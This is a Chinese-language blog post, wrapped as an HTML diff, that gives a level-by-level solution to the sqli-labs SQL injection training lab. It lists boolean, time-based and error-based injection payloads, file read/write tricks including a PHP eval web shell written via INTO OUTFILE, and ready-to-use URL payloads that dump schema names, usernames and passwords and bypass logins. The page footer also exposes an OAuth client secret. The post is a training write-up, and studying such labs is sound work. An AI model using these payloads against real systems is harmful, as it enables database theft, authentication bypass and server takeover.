@@ -1,0 +1,516 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqli-labs 通关之路（未完成） | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqli-labs 通关之路（未完成）
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-10-19
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/BMmmwa7FW.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>N年前就下载过的 SQL 注入靶场，终于在今天认真玩一玩。网上教程和攻略很多，方法也不尽相同。取所需吧~</p>
+<h1 id="前置知识点乱记">前置知识点乱记</h1>
+<p>SQL注入 5 种类型：布尔注入，时间注入，报错注入，联合查询注入，堆查询注入。还有一种 SQLMAP 支持的，内联注入。</p>
+<h2 id="常用函数">常用函数：</h2>
+<ul>
+<li><code>version()</code>   MySQL版本</li>
+<li><code>user()</code>   数据库用户名</li>
+<li><code>database()</code>   数据库名</li>
+<li><code>@@datadir</code>   数据库路径</li>
+<li><code>@@version_compile_os</code>   操作系统版本</li>
+</ul>
+<h2 id="字符串连接函数">字符串连接函数：</h2>
+<ul>
+<li><code>concat(a,b,...)</code>   没有分隔符地连接字符串</li>
+<li><code>concat_ws(separator,a,b,...)</code>   含有分隔符地连接字符串</li>
+<li><code>group_concat(a,b,...)</code>   以逗号分隔</li>
+</ul>
+<h2 id="布尔盲注逻辑判断">布尔盲注逻辑判断：</h2>
+<ul>
+<li><code>left(database(),1)&gt;'s'</code>   <code>left(a,b)</code> 从左侧截取a的前b位</li>
+<li><code>ascii(substr((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1))=101</code>  <code>substr(a,b,c)</code> 从b位置开始，截取字符串a的c长度。<code>ascii()</code>将某个字符串转换为ascii值。</li>
+<li><code>ascii(substr(select database(),1,1))=98</code></li>
+<li><code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98</code> <code>ord()</code> 函数同 <code>ascii()</code>，<code>mid()</code>  从位置b开始，截取a字符串的c位。</li>
+<li><code>select user() regexp '^[a-z]'</code> 使用正则，正确时结果为1，不正确时结果为0，例如：<code>select * from users where id=1 and 1=(if((user() regexp '^r'),1,0))</code>，通过if语句的条件判断，例如：<code>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);</code>，再使用中只需要更换表达式即可 <code>'^u[a-z]' -&gt; '^us[a-z]' -&gt; '^use[a-z]' -&gt; '^user[a-z]' -&gt; FALSE</code></li>
+<li>like匹配注入：<code>select user() like ‘ro%’</code></li>
+</ul>
+<h2 id="基于报错的sql盲注">基于报错的SQL盲注：</h2>
+<p>构造payload让信息通过错误提示回显出来。</p>
+<ol>
+<li>
+<p>floor 报错<br>
+<code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a</code><br>
+此处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 <code>group by</code>进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时 重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 <code>rand(0)</code>，<code>rand()</code>需要多试几次才行<br>
+可以简化为：<br>
+<code>select count(\*) from information_schema.tables group by concat(version(), floor(rand(0)\*2))</code><br>
+如果 rand 被禁用了可以使用用户变量来报错<br>
+<code>select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))</code></p>
+</li>
+<li>
+<p>用户变量报错<br>
+<code>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></p>
+</li>
+<li>
+<p>exp报错，对mysql版本有要求<br>
+<code>select exp(~(select * FROM(SELECT USER())a))</code> double 数值类型超出范围</p>
+</li>
+<li>
+<p>bigint溢出报错<br>
+<code>select !(select * from (select user())x)  ~0</code></p>
+</li>
+<li>
+<p>extractvalue报错<br>
+<code>extractvalue(1,concat(0x7e,(select @@version),0x7e))</code><br>
+<code>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));  </code></p>
+</li>
+<li>
+<p>updatexml报错<br>
+<code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p>
+</li>
+<li>
+<p>NAME_CONST报错<br>
+<code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code> 利用了mysql重复特性</p>
+</li>
+<li>
+<p>join报错爆字段，知道表名的情况下使用<br>
+<code>select * from (select * from 表名 a join 表名 b) c) </code><br>
+在得到一个字段后，使用using得到下一个字段<br>
+<code>select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c </code></p>
+</li>
+<li>
+<p>使用GeometryCollection报错<br>
+<code>and geometrycollection((select * from(select * from(select user())a)b));</code></p>
+</li>
+<li>
+<p>通过polygon报错<br>
+<code>and polygon((select * from(select * from(select user())a)b));</code></p>
+</li>
+<li>
+<p>通过multipoint报错<br>
+<code>and multipoint((select * from(select * from(select user())a)b));</code></p>
+</li>
+<li>
+<p>通过multlinestring报错<br>
+<code>and multilinestring((select * from(select * from(select user())a)b));</code></p>
+</li>
+<li>
+<p>通过multpolygon报错<br>
+<code>and multipolygon((select * from(select * from(select user())a)b));</code></p>
+</li>
+<li>
+<p>通过linestring报错<br>
+<code>and linestring((select * from(select * from(select user())a)b));</code></p>
+</li>
+</ol>
+<h2 id="基于时间的sql盲注">基于时间的SQL盲注：</h2>
+<ul>
+<li><code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code> 使用if判断，如果条件为假，执行sleep进行延时</li>
+<li><code>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1</code>   <code>BENCHMARK(count,expr)</code>用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执 行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源<br>
+Mysql--<code>BENCHMARK(100000,MD5(1))</code> or <code>sleep(5)</code><br>
+Postgresql--<code>PG_SLEEP(5)</code> OR <code>GENERATE_SERIES(1,10000)</code><br>
+Ms sql server--<code>WAITFOR DELAY ‘0:0:5’</code></li>
+</ul>
+<h2 id="导入导出相关操作">导入导出相关操作</h2>
+<p><code>load_file()</code> 导出文件，读取文件并返回该文件的内容。前提条件：</p>
+<ul>
+<li>文件可读，有读取权限：<code>and (select count(*) from mysql.user)&gt;0/*</code> 说明具有读写权限</li>
+<li>必须拥有文件的绝对路径</li>
+<li>文件大小 max_allowed_packet<br>
+一些常见的写法：</li>
+</ul>
+<pre><code class="language-sql">load_file(char(99,58,47,98,111,111,116,46,105,110,105)) -- ascii代码
+load_file(0x633a2f626f6f742e696e69)  -- 16进制
+load_file(c:\\boot.ini) -- 路径里的 / 用 \\ 代替
+</code></pre>
+<p><code>load data infile</code> 将文件导入数据库</p>
+<pre><code class="language-sql">load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t'
+lines terminated by '\n'
+</code></pre>
+<p><code>SELECT.....INTO OUTFILE 'file_name'</code> 将内容写入到文件中<br>
+也需要文件写权限和绝对路径。</p>
+<pre><code class="language-sql">select &lt;?php @eval($_post[“cmd”])?&gt; into outfile “c:\\htdocs\\test.php” -- 直接写入文件
+select version() into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件  
+-- 通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY
+-- 16 进制可以为一句话或者其他任何的代码，可自行构造
+</code></pre>
+<h2 id="一些技巧">一些技巧</h2>
+<p>盲注时，可以先转为小写进行字符比较，得到字符串后再判断大小写，能够大大缩小数据包数量。</p>
+<h1 id="part-ibasic-challenges">Part I：Basic Challenges</h1>
+<h2 id="a-nameless-1less-1a"><a name="less-1">less-1</a></h2>
+<p>注入点：<code>SELECT * FROM users WHERE id='$id' LIMIT 0,1</code></p>
+<p>注入思路：单引号的字符串注入，常规注入，通过<code>information_schema</code>获取数据库、表、字段信息</p>
+<p>注入过程：</p>
+<pre><code class="language-http">?id=1
+?id=1'
+?id=1'+and+1=1+--+-
+?id=1'+and+1=2+--+-
+?id=1'+order+by+3+--+-
+?id=-1'+union+select+1,2,3+--+-
+?id=-1'+union+select+1,group_concat(schema_name),3+from+information_schema.schemata--+-
+?id=-1'+union+select+1,group_concat(table_name),3+from+information_schema.TABLES+where+table_schema%3d'security'--+-
+?id=-1'+union+select+1,group_concat(column_name),3+from+information_schema.COLUMNS+where+table_name%3d'users'--+-
+?id=-1'+union+select+1,group_concat(id,username,password),3+from+users+where+id%3d1--+-
+</code></pre>
+<h2 id="less-2">less-2</h2>
+<p>注入点：<code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code></p>
+<p>注入思路：整型注入，同 <a href="#less-1">less-1</a></p>
+<p>注入过程：</p>
+<pre><code class="language-http">?id=1
+?id=1+and+1=1+--+-
+?id=1+and+1=2+--+-
+?id=1+order+by+3+--+-
+?id=-1+union+select+1,2,3+--+-
+?id=-1+union+select+1,group_concat(schema_name),3+from+information_schema.schemata--+-
+?id=-1+union+select+1,group_concat(table_name),3+from+information_schema.TABLES+where+table_schema%3d'security'--+-
+?id=-1+union+select+1,group_concat(column_name),3+from+information_schema.COLUMNS+where+table_name%3d'users'--+-
+?id=-1+union+select+1,group_concat(id,username,password),3+from+users+where+id%3d1--+-
+</code></pre>
+<h2 id="less-3">less-3</h2>
+<p>注入点：<code>SELECT * FROM users WHERE id=('$id') LIMIT 0,1</code></p>
+<p>注入思路：注入点被单引号及括号包含，需要闭合后单引号和括号，判断时可以使用注释，也可自行闭合</p>
+<p>注入过程：</p>
+<pre><code class="language-http">?id=1
+?id=2')+and+1=('1
+?id==2')+and+1=('2
+</code></pre>
+<h2 id="less-4">less-4</h2>
+<p>注入点：<code>SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1</code></p>
+<p>注入思路：参数由双引号和括号包裹，同 <a href="#less-1">less-1</a></p>
+<p>注入过程：略</p>
+<h2 id="a-nameless-5less-5a"><a name="less-5">less-5</a></h2>
+<p>注入点：<code>SELECT * FROM users WHERE id='$id' LIMIT 0,1</code></p>
+<p>注入思路：注入点还是普通的单引号，但是没有回显，为盲注。使用<code>length()</code> 判断位数，<code>ascii()</code> 配合<code>substr()</code>截取字符串比较判断。也可以使用REGEXP正则匹配，like匹配，或ord等函数。</p>
+<p>注入过程：</p>
+<pre><code class="language-http">?id=1
+?id=1'
+?id=1'+--+-
+?id=1'+and+length(database())%3d8+--+-
+?id=1'+and+left(database(),1)%3d's'+--+-   (查数据库名)
+?id=1'+and+ascii(substr((select+table_name+from+information_schema.TABLES+where+table_schema%3ddatabase()+limit+0,1),1,1))%3d101--+-  （查第一个表的第一个字符）
+?id=1'+and+ascii(substr((select+table_name+from+information_schema.TABLES+where+table_schema%3ddatabase()+limit+0,1),2,1))%3d109--+- （查第一个表的第二个字符）
+?id=1'+and+ascii(substr((select+table_name+from+information_schema.TABLES+where+table_schema%3ddatabase()+limit+1,1),1,1))%3d114--+-  （查第二个表的第一个字符）
+?id=1'+AND+1%3d(SELECT+1+FROM+information_schema.COLUMNS+WHERE+table_schema%3d'security'+AND+table_name%3d'users'+AND+column_name+REGEXP+'^id[a-z]*'+LIMIT+0,1)--+- (使用regexp查询第一个列名)
+?id=1'+AND+1%3d(SELECT+1+FROM+information_schema.COLUMNS+WHERE+table_schema%3d'security'+AND+table_name%3d'users'+AND+column_name+LIKE+'u%25'+LIMIT+0,1+)--+- (使用like匹配列名)
+?id=1'+AND+1%3d(ORD(MID((SELECT+IFNULL(CAST(username+AS+CHAR),0x20)FROM+security.users+ORDER+BY+id+LIMIT+0,1),1,1))%3d68)--+- (使用ord和mid获取字段数据第一个字符)
+?id=1'+AND+1%3d(ORD(MID((SELECT+IFNULL(CAST(username+AS+CHAR),0x20)FROM+security.users+ORDER+BY+id+LIMIT+0,1),2,1))%3d117)--+- (使用ord和mid获取字段数据第二个字符)
+</code></pre>
+<p>注入思路2：使用单引号会报错，因此尝试报错注入。</p>
+<p>注入过程：</p>
+<pre><code class="language-http">1'+union+select+1,count(*),concat(0x3a,0x3a,(select+user()),0x3a,0x3a,floor(rand(0)*2))+a+from+information_schema.columns+group+by+a+--+-  (使用 floor 报错)
+?id=1'+and+extractvalue(1,concat(0x7e,(select+%40%40version),0x7e))--+-  （使用extractvalue报错）
+</code></pre>
+<p>注入思路3：尝试延时注入</p>
+<p>注入过程：</p>
+<pre><code class="language-http">?id=1'+UNION+SELECT+(IF(SUBSTRING(current,1,1)%3dCHAR(115),BENCHMARK(50000000,ENCODE('MSG','by+5+seconds')),null)),2,3+FROM+(select+database()+as+current)+as+tb1--+-   (使用BENCHMARK进行延时)
+?id=1'+and+if(ascii(substr(database(),1,1))%3d'117',1,sleep(5))--+-  (使用if进行sleep)
+</code></pre>
+<h2 id="less-6">less-6</h2>
+<p>注入点：<code>SELECT * FROM users WHERE id='$id' LIMIT 0,1</code></p>
+<p>注入思路：参数由双引号包裹，同 <a href="#less-5">less-5</a></p>
+<p>注入过程：略</p>
+<h2 id="less-7">less-7</h2>
+<p>注入点：<code>SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1</code></p>
+<p>注入思路：题目提示使用outfile导出文件</p>
+<p>注入过程：</p>
+<pre><code class="language-http">?id=1'))+or+1%3d1+--+-
+?id=1'))+order+by+3--+-
+1'))+union+select+1,2,'aaa'+into+outfile+'/Applications/MAMP/htdocs/sqli/Less-7/123.txt'--+-
+</code></pre>
+<h2 id="less-8">less-8</h2>
+<p>注入点：<code>SELECT * FROM users WHERE id='$id' LIMIT 0,1</code></p>
+<p>注入思路：单引号包裹，布尔盲注，同 <a href="#less-5">less-5</a></p>
+<p>注入过程：</p>
+<pre><code class="language-http">?id=1'+and+1%3d2--+-
+?id=1'+and+1%3d1--+-
+?id=1'+order+by+3--+-
+?id=1'+and+left(database(),2)%3d'se'--+-
+?id=1'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1))%3d101--+-
+</code></pre>
+<h2 id="a-nameless-9less-9a"><a name="less-9">less-9</a></h2>
+<p>注入点：<code>SELECT * FROM users WHERE id='$id' LIMIT 0,1</code></p>
+<p>注入思路：单引号包裹，延时注入</p>
+<p>注入过程：</p>
+<pre><code class="language-http">?id=1'+and+if(ascii(substr(database(),1,1))%3d115,0,sleep(10))--+-
+?id=1'+and+If(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3d'security'+limit+0,1),1,1))%3d102,1,sleep(5))--+-
+?id=1'+and+if(ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3d'users'+limit+0,1),1,1))%3d85,1,sleep(5))--+
+?id=1'+and+if(ascii(substr((select+username+from+users+where+id%3d1+limit+0,1),1,1))%3d68,1,sleep(5))--+- 
+</code></pre>
+<h2 id="less-10">less-10</h2>
+<p>注入点：<code>SELECT * FROM users WHERE id='$id' LIMIT 0,1</code></p>
+<p>注入思路：双引号包裹，同<a href="#less-9">less-9</a></p>
+<p>注入过程：略</p>
+<h2 id="a-nameless-11less-11a"><a name="less-11">less-11</a></h2>
+<p>注入点：<code>SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1</code></p>
+<p>注入思路：登陆位置的注入，如果目的是成功登陆，就可以构造逻辑闭合条件。由于能看到报错，想注入数据的话可以使用报错注入。</p>
+<p>注入过程：</p>
+<pre><code class="language-http">uname=admin' or 1=1 -- - （逻辑修改登陆）
+uname=aaa' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) -- - (报错注入)
+</code></pre>
+<p>注入思路2：由于登陆成功后会将结果回显在页面上，可以使用<code>union select</code>执行查询结果</p>
+<p>注入过程：</p>
+<pre><code class="language-http">uname=1admin ' union select 1,database()#
+</code></pre>
+<h2 id="less-12">less-12</h2>
+<p>注入点：<code>SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1</code></p>
+<p>注入思路：使用括号包裹，同<a href="#less-11">less-11</a></p>
+<p>注入过程：略</p>
+<h2 id="a-nameless-13less-13a"><a name="less-13">less-13</a></h2>
+<p>注入点：<code>SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1</code></p>
+<p>注入思路：使用单引号和括号包裹，并且但登陆后不进行数据的回显了，因此可以使用报错注入或者盲注来获取数据</p>
+<p>注入过程：</p>
+<pre><code class="language-http">uname=admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))# (报错注入)
+uname=admin') and left(database(),1)&gt;'a' -- -  (盲注)
+uname=admin') and ascii(substr((select table_name from information_schema.tables where table_schema=DATABASE() limit 0,1),1,1))=101 -- -  （盲注）
+</code></pre>
+<h2 id="less-14">less-14</h2>
+<p>注入点：<code>SELECT username, password FROM users WHERE username=&quot;$uname&quot; and password=&quot;$passwd&quot; LIMIT 0,1</code></p>
+<p>注入思路：使用了双引号，同<a href="#less-13">less-13</a></p>
+<p>注入过程：略</p>
+<h2 id="less-15">less-15</h2>
+<p>注入点：<code>SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1</code></p>
+<p>注入思路：使用单引号，除了登陆成功或失败没有回显。可以使用盲注或延时注入。同<a href="#less-13">less-13</a></p>
+<p>注入过程：略</p>
+<h2 id="less-16">less-16</h2>
+<p>注入点：<code>SELECT username, password FROM users WHERE username=(&quot;$uname&quot;) and password=(&quot;$passwd&quot;) LIMIT 0,1</code></p>
+<p>注入思路：使用双引号和括号包裹。同<a href="#less-13">less-13</a></p>
+<p>注入过程：略</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B9%B1%E8%AE%B0">前置知识点乱记</a>
+<ul>
+<li><a href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0">常用函数：</a></li>
+<li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0">字符串连接函数：</a></li>
+<li><a href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD">布尔盲注逻辑判断：</a></li>
+<li><a href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84sql%E7%9B%B2%E6%B3%A8">基于报错的SQL盲注：</a></li>
+<li><a href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84sql%E7%9B%B2%E6%B3%A8">基于时间的SQL盲注：</a></li>
+<li><a href="#%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C">导入导出相关操作</a></li>
+<li><a href="#%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7">一些技巧</a></li>
+</ul>
+</li>
+<li><a href="#part-ibasic-challenges">Part I：Basic Challenges</a>
+<ul>
+<li><a href="#a-nameless-1less-1a"><a name="less-1">less-1</a></a></li>
+<li><a href="#less-2">less-2</a></li>
+<li><a href="#less-3">less-3</a></li>
+<li><a href="#less-4">less-4</a></li>
+<li><a href="#a-nameless-5less-5a"><a name="less-5">less-5</a></a></li>
+<li><a href="#less-6">less-6</a></li>
+<li><a href="#less-7">less-7</a></li>
+<li><a href="#less-8">less-8</a></li>
+<li><a href="#a-nameless-9less-9a"><a name="less-9">less-9</a></a></li>
+<li><a href="#less-10">less-10</a></li>
+<li><a href="#a-nameless-11less-11a"><a name="less-11">less-11</a></a></li>
+<li><a href="#less-12">less-12</a></li>
+<li><a href="#a-nameless-13less-13a"><a name="less-13">less-13</a></a></li>
+<li><a href="#less-14">less-14</a></li>
+<li><a href="#less-15">less-15</a></li>
+<li><a href="#less-16">less-16</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://su18.org/post/su18.jsp/">
+              <h3 class="post-title">
+                su18.jsp
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
